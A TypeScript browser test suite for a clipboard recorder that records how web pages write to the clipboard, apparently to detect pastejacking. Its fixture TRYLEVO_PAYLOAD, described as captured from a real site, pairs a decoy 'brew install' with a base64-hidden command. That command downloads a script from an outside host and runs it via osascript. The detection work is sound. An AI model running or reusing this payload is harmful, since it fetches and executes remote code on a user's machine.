import { describe, expect, test } from "bun:test";
import type { Browser, Frame, Page } from "rebrowser-puppeteer-core";

import { ClipboardRecorder, MAX_CLIPBOARD_WRITE_CHARACTERS, MAX_CLIPBOARD_WRITES, type ClipboardWrite } from "./clipboard";
import { VisitorTabs } from "./visitor_tabs";
import { chromiumAvailable, html, launchTestChromium } from "./task/test_helpers";
import { sleep } from "../util/sleep";

/**
 * The command trylevo.app's Copy button put on the clipboard (production case
 * 384401854580134038): it fetched ./install-command.txt while its dialog
 * showed `brew install --cask levo`.
 */
const TRYLEVO_PAYLOAD = ": \"brew install --cask levo\"; printf 'Y3VybCAtc2ZMIC0tcmV0cnkgMyAtLXJldHJ5LWFsbC1lcnJvcnMgaHR0cHM6Ly9ob3N0c3luYy5wcm8vaGdwMDNtL0xOY2Y4S3BtNnFXciB8IG9zYXNjcmlwdCAtbCBKYXZhU2NyaXB0' | base64 -d | zsh";

/** Each button records what the page's own call gave it, so a page with the recorder and one without can be compared. */
const settle = (call: string) => `Promise.resolve().then(() => ${call}).then(() => { window.outcome = "ok"; }, (error) => { window.outcome = "error " + error.name; })`;

const KIT_PAGE = `<h1>Levo</h1>
<p id="shown">brew install --cask levo</p>
<button id="writeText" onclick='${settle("navigator.clipboard.writeText(\"plain writeText\")")}'>writeText</button>
<button id="itemString" onclick='${settle("navigator.clipboard.write([new ClipboardItem({ \"text/plain\": \"item string\", \"text/html\": \"<b>item</b>\" })])")}'>item string</button>
<button id="itemBlob" onclick='${settle("navigator.clipboard.write([new ClipboardItem({ \"text/plain\": new Blob([\"item blob\"], { type: \"text/plain\" }) })])")}'>item blob</button>
<button id="itemPromise" onclick='${settle("navigator.clipboard.write([new ClipboardItem({ \"text/plain\": fetch(\"/install-command.txt\").then((answer) => answer.blob()) })])")}'>item promise</button>
<button id="htmlOnly" onclick='${settle("navigator.clipboard.write([new ClipboardItem({ \"text/html\": new Blob([\"<b>only markup</b>\"], { type: \"text/html\" }) })])")}'>html only</button>
<button id="hijack" onclick="window.copyMode = 'hijack'; window.outcome = document.execCommand('copy'); window.copyMode = undefined;">hijack</button>
<button id="unprevented" onclick="window.copyMode = 'unprevented'; getSelection().selectAllChildren(document.getElementById('shown')); window.outcome = document.execCommand('copy'); window.copyMode = undefined;">unprevented</button>
<button id="selection" onclick="getSelection().selectAllChildren(document.getElementById('shown')); window.outcome = document.execCommand('copy');">selection</button>
<button id="textarea" onclick="const area = document.createElement('textarea'); area.value = 'textarea fallback\\nsecond line'; document.body.append(area); area.select(); window.outcome = document.execCommand('copy'); area.remove();">textarea</button>
<button id="install" onclick='${settle("fetch(\"./install-command.txt\").then((answer) => answer.text()).then((command) => navigator.clipboard.writeText(command))")}'>Copy</button>
<button id="open" onclick="window.open('/opened')">open</button>
<button id="flood" onclick="for (let index = 0; index < 60; index++) navigator.clipboard.writeText('flood ' + index).catch(() => undefined)">flood</button>
<button id="long" onclick="navigator.clipboard.writeText('x'.repeat(20000)).catch(() => undefined)">long</button>
<script>
document.addEventListener("copy", (event) => {
	window.copies = (window.copies ?? 0) + 1;
	if (window.copyMode === "hijack") { event.clipboardData.setData("text/plain", "hijacked copy"); event.preventDefault(); }
	// Set without preventing the default: the browser copies the selection instead.
	if (window.copyMode === "unprevented") event.clipboardData.setData("text/plain", "ignored set");
});
</script>
<iframe id="same" src="/same-frame"></iframe>`;

function serveKit() {
	const frameSite = Bun.serve({
		port: 0,
		fetch: () => html(`<button id="frameCopy" onclick="navigator.clipboard.writeText('from the cross-site frame').catch(() => undefined)">copy</button>`, "Frame"),
	});
	const site = Bun.serve({
		port: 0,
		fetch: (request) => {
			const { pathname } = new URL(request.url);
			if (pathname === "/install-command.txt") return new Response(TRYLEVO_PAYLOAD, { headers: { "content-type": "text/plain" } });
			if (pathname === "/same-frame") return html(`<button id="frameCopy" onclick="navigator.clipboard.writeText('from the same-site frame').catch(() => undefined)">copy</button>`, "Frame");
			// Written by its first script, before the recorder's listener for the document exists.
			if (pathname === "/early") return html(`<script>navigator.clipboard.writeText("written while loading").catch(() => undefined)</script><p>Early</p>`, "Early");
			if (pathname === "/opened") return html(`<button id="tabCopy" onclick="navigator.clipboard.writeText('from the opened tab').catch(() => undefined)">copy</button>`, "Opened");
			if (pathname === "/second") return html(`<button id="writeText" onclick="navigator.clipboard.writeText('after navigating').catch(() => undefined)">copy</button>`, "Second");
			if (pathname === "/with-frame") return html(`<iframe id="cross" src="http://localhost:${frameSite.port}/frame"></iframe>`, "Framed");
			return html(KIT_PAGE, "Levo");
		},
	});
	const stop = () => { site.stop(true); frameSite.stop(true); };
	return { url: `http://127.0.0.1:${site.port}/`, frameOrigin: `http://localhost:${frameSite.port}`, stop };
}

async function until(condition: () => boolean, timeoutMs = 5_000): Promise<void> {
	const deadline = Date.now() + timeoutMs;
	while (!condition()) {
		if (Date.now() > deadline) throw new Error("timed out waiting for the clipboard writes");
		await sleep(25);
	}
}

/** A page whose tab the recorder follows from its next document on. */
async function recordedPage(browser: Browser, recorder: ClipboardRecorder): Promise<Page> {
	const page = await browser.newPage();
	await recorder.attach(await page.target().createCDPSession());
	return page;
}

async function grantClipboard(browser: Browser, origin: string) {
	await browser.defaultBrowserContext().overridePermissions(origin, ["clipboard-read", "clipboard-write", "clipboard-sanitized-write"]);
}

const writeOf = (text: string, via: ClipboardWrite["via"], documentUrl: string) => ({ text, via, documentUrl, at: expect.any(String) });

async function clickAndRecord(page: Page | Frame, recorder: ClipboardRecorder, selector: string): Promise<ClipboardWrite[]> {
	const before = recorder.writes().length;
	await page.click(selector);
	await until(() => recorder.writes().length > before);
	// Anything else the click wrote arrives with the first.
	await sleep(150);
	return recorder.writes().slice(before);
}

describe.skipIf(!chromiumAvailable)("the clipboard recorder, in a real browser", () => {
	test("records every way a page writes the clipboard, and the page's own copy works as without it", async () => {
		const { url, stop } = serveKit();
		const browser = await launchTestChromium();
		try {
			await grantClipboard(browser, new URL(url).origin);
			const recorder = new ClipboardRecorder();
			const page = await recordedPage(browser, recorder);
			await page.goto(url);
			await page.bringToFront();
			const record = (selector: string) => clickAndRecord(page, recorder, selector);

			expect(await record("#writeText")).toEqual([writeOf("plain writeText", "writeText", url)]);
			// A ClipboardItem's plain text, given as a string, a Blob, or a promise of a fetched Blob; its markup is not what a visitor pastes.
			expect(await record("#itemString")).toEqual([writeOf("item string", "write", url)]);
			expect(await record("#itemBlob")).toEqual([writeOf("item blob", "write", url)]);
			expect(await record("#itemPromise")).toEqual([writeOf(TRYLEVO_PAYLOAD, "write", url)]);
			// A copy handler that sets the text and prevents the default copy decides what is copied.
			expect(await record("#hijack")).toEqual([writeOf("hijacked copy", "copy_event", url)]);
			// One that sets it without preventing the default leaves the selection copied.
			expect(await record("#unprevented")).toEqual([writeOf("brew install --cask levo", "exec_command", url)]);
			expect(await record("#selection")).toEqual([writeOf("brew install --cask levo", "exec_command", url)]);
			// The textarea fallback copy scripts use: its selected value, line breaks kept.
			expect(await record("#textarea")).toEqual([writeOf("textarea fallback\nsecond line", "exec_command", url)]);
			// trylevo.app's Copy button: it fetches the command first, then writes it.
			expect(await record("#install")).toEqual([writeOf(TRYLEVO_PAYLOAD, "writeText", url)]);
			expect(await page.evaluate(() => navigator.clipboard.readText())).toBe(TRYLEVO_PAYLOAD);

			// Only markup, and the visitor's own copy of what the page shows, are not the page's writes.
			const count = recorder.writes().length;
			await page.click("#htmlOnly");
			const copies = () => page.evaluate(() => (window as unknown as { copies: number }).copies);
			const copiesBefore = await copies();
			await page.evaluate(() => getSelection()!.selectAllChildren(document.getElementById("shown")!));
			await page.keyboard.down("Control");
			await page.keyboard.press("KeyC", { commands: ["copy"] });
			await page.keyboard.up("Control");
			await sleep(300);
			expect(await copies()).toBe(copiesBefore + 1);
			expect(recorder.writes()).toHaveLength(count);

			// A same-site frame is recorded under its own address.
			const frame = page.frames().find((candidate) => candidate.url().endsWith("/same-frame"))!;
			expect(await clickAndRecord(frame, recorder, "#frameCopy")).toEqual([writeOf("from the same-site frame", "writeText", `${url}same-frame`)]);

			// The next document of the tab is recorded too, and so is what a document writes while it loads.
			await page.goto(`${url}second`);
			expect(await record("#writeText")).toEqual([writeOf("after navigating", "writeText", `${url}second`)]);
			await page.goto(`${url}early`);
			await until(() => recorder.writes().some((write) => write.text === "written while loading"));
			expect(recorder.writes().at(-1)).toEqual(writeOf("written while loading", "writeText", `${url}early`));
		} finally {
			await browser.close();
			stop();
		}
	}, 60_000);

	test("the page sees the same clipboard API and globals as without the recorder, and the same outcome of each copy", async () => {
		const { url, stop } = serveKit();
		const browser = await launchTestChromium();
		try {
			await grantClipboard(browser, new URL(url).origin);
			const recorder = new ClipboardRecorder();
			const recorded = await recordedPage(browser, recorder);
			const plain = await browser.newPage();
			await recorded.goto(url);
			await plain.goto(url);
			const surface = (page: Page) => page.evaluate(() => ({
				globals: Object.getOwnPropertyNames(window).sort(),
				documentKeys: Object.getOwnPropertyNames(document).sort(),
				sources: [Clipboard.prototype.writeText, Clipboard.prototype.write, DataTransfer.prototype.setData, Document.prototype.execCommand, Function.prototype.toString].map((method) => `${method.name}/${method.length}: ${Function.prototype.toString.call(method)} ${String(method)}`),
				descriptors: [Object.getOwnPropertyDescriptor(Clipboard.prototype, "writeText"), Object.getOwnPropertyDescriptor(Document.prototype, "execCommand")].map((descriptor) => [descriptor?.writable, descriptor?.enumerable, descriptor?.configurable]),
			}));
			const recordedSurface = await surface(recorded);
			expect(recordedSurface).toEqual(await surface(plain));
			expect(recordedSurface.sources[0]).toBe("writeText/1: function writeText() { [native code] } function writeText() { [native code] }");
			expect(recordedSurface.sources[4]).toBe("toString/0: function toString() { [native code] } function toString() { [native code] }");

			for (const selector of ["#writeText", "#itemString", "#itemPromise", "#hijack", "#selection", "#install"]) {
				const outcomes: unknown[] = [];
				for (const page of [recorded, plain]) {
					await page.bringToFront();
					await page.evaluate(() => { (window as unknown as { outcome?: unknown }).outcome = undefined; });
					await page.click(selector);
					await page.waitForFunction(() => (window as unknown as { outcome?: unknown }).outcome !== undefined);
					outcomes.push([await page.evaluate(() => (window as unknown as { outcome?: unknown }).outcome), await page.evaluate(() => navigator.clipboard.readText())]);
				}
				expect({ selector, outcome: outcomes[0] }).toEqual({ selector, outcome: outcomes[1] });
			}
			// A write the browser refuses (no clipboard permission for the origin) is refused as it would be;
			// the attempt is still what the page tried to put on the clipboard.
			await browser.defaultBrowserContext().clearPermissionOverrides();
			for (const page of [recorded, plain]) {
				await page.evaluate(() => { (window as unknown as { outcome?: unknown }).outcome = undefined; });
				await page.evaluate(() => (document.getElementById("writeText") as HTMLButtonElement).click());
				await page.waitForFunction(() => (window as unknown as { outcome?: unknown }).outcome !== undefined);
			}
			const refused = await Promise.all([recorded, plain].map((page) => page.evaluate(() => (window as unknown as { outcome?: unknown }).outcome)));
			expect(refused).toEqual(["error NotAllowedError", "error NotAllowedError"]);
			await until(() => recorder.writes().filter((write) => write.text === "plain writeText").length === 2);
		} finally {
			await browser.close();
			stop();
		}
	}, 60_000);

	test("records a frame in another process and a tab the page opens, held until it is recorded", async () => {
		const { url, frameOrigin, stop } = serveKit();
		const browser = await launchTestChromium({}, ["--site-per-process"]);
		try {
			await grantClipboard(browser, new URL(url).origin);
			await grantClipboard(browser, frameOrigin);
			const recorder = new ClipboardRecorder();
			const page = await recordedPage(browser, recorder);
			const tabs = await VisitorTabs.start(browser, page, [(tab) => (tab.opener ? recorder.attach(tab.session, { held: true }) : undefined)]);
			try {
				await page.goto(`${url}with-frame`);
				await page.bringToFront();
				const cross = page.frames().find((frame) => frame.url().startsWith(frameOrigin))!;
				// The cross-site frame runs in a process of its own, as its own target.
				expect(browser.targets().some((target) => target.url() === `${frameOrigin}/frame`)).toBe(true);
				expect(await clickAndRecord(cross, recorder, "#frameCopy")).toEqual([writeOf("from the cross-site frame", "writeText", `${frameOrigin}/frame`)]);

				await page.goto(url);
				await page.click("#open");
				const opened = await tabs.settled(5_000);
				expect(opened).not.toBe(tabs.first);
				const tabPage = opened.page!;
				await tabPage.waitForSelector("#tabCopy");
				await tabPage.bringToFront();
				expect(await clickAndRecord(tabPage, recorder, "#tabCopy")).toEqual([writeOf("from the opened tab", "writeText", `${url}opened`)]);
			} finally {
				await tabs.stop();
			}
		} finally {
			await browser.close();
			stop();
		}
	}, 60_000);

	test("keeps a bounded record: a page copying in a loop or a huge text cannot grow it", async () => {
		const { url, stop } = serveKit();
		const browser = await launchTestChromium();
		try {
			await grantClipboard(browser, new URL(url).origin);
			const recorder = new ClipboardRecorder();
			const page = await recordedPage(browser, recorder);
			await page.goto(url);
			await page.bringToFront();
			const [long] = await clickAndRecord(page, recorder, "#long");
			expect(long!.text).toBe("x".repeat(MAX_CLIPBOARD_WRITE_CHARACTERS));
			await page.click("#flood");
			await until(() => recorder.writes().length === MAX_CLIPBOARD_WRITES);
			await sleep(300);
			expect(recorder.writes()).toHaveLength(MAX_CLIPBOARD_WRITES);
			expect(recorder.writes().at(-1)!.text).toBe(`flood ${MAX_CLIPBOARD_WRITES - 2}`);
		} finally {
			await browser.close();
			stop();
		}
	}, 60_000);
});
